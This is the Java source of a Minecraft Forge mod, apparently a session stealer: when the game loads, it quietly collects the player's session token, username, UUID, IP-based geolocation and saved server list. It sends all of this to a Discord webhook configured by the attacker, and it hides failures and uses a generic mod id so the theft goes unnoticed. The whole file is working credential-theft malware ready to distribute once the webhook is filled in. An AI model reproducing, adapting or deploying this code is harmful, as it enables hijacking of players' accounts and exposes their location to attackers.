package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import org.apache.commons.io.IOUtils;

import java.net.URL;

@Mod(modid = "hello") // some random modid
public class Main {

    /**
     * Your Discord webhook URL
     * <p>
     * Example: https://discord.com/api/webhooks/...
     */
    private static final String WEBHOOK_URL = "";

    /**
     * Adds @everyone to webhook message
     */
    private static final boolean PING_EVERYONE = true;

    @EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        new Thread(() -> {
            MinecraftForge.EVENT_BUS.register(this);

            try {
                final Minecraft mc = Minecraft.getMinecraft();
                final Session session = mc.getSession();

                final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL).setUsername("github.com/14ms/MC-Session-Stealer");

                try {
                    final JsonObject info = (JsonObject) new JsonParser().parse(IOUtils.toString(new URL("https://ipapi.co/json")));

                    final DiscordWebhook.EmbedObject geoEmbed = new DiscordWebhook.EmbedObject()
                            .setTitle(":earth_americas: IP Info")
                            .setColor(0x4400FF)
                            .setDescription("Contains information about the target's IP address and geo-location")
                            .addField(":globe_with_meridians: Country", "```" + info.get("country_name").getAsString() + "```", true)
                            .addField(":globe_with_meridians: City",    "```" + info.get("city").getAsString() + "```",         true)
                            .addField(":globe_with_meridians: Region",  "```" + info.get("region").getAsString() + "```",       true)
                            .addField(":satellite_orbital: IP Address", "```" + info.get("ip").getAsString() + "```",           true)
                            .addField(":satellite: Protocol",           "```" + info.get("version").getAsString() + "```",      true)
                            .addField(":clock10: Timezone",             "```" + info.get("timezone").getAsString() + "```",     true);

                    webhook.addEmbed(geoEmbed);
                } catch (Exception ignored) {
                }

                final DiscordWebhook.EmbedObject accountEmbed = new DiscordWebhook.EmbedObject()
                        .setTitle(":unlock: Account Info")
                        .setColor(0x6E39FF)
                        .setDescription("[NameMC](https://namemc.com/" + session.getPlayerID() + ") | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ") | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ")")
                        .addField(":identification_card: Name", "```" + session.getUsername() + "```", true)
                        .addField(":identification_card: UUID", "```" + session.getPlayerID() + "```", true)
                        .addField(":key: Session Token",        "```" + session.getToken() + "```",    false);

                final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                        .setTitle(":file_folder: Saved Servers")
                        .setColor(0x8F67FC)
                        .setDescription("Contains the target's list of saved Minecraft servers");

                final ServerList servers = new ServerList(mc);
                for (int i = 0; i < servers.countServers(); i++) {
                    final ServerData server = servers.getServerData(i);

                    serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
                }

                if (PING_EVERYONE)
                    webhook.setContent("@everyone");

                webhook.addEmbed(accountEmbed).addEmbed(serversEmbed).execute();

            } catch (Exception ignored) {
            }

            MinecraftForge.EVENT_BUS.unregister(this);
        }).start();
    }
}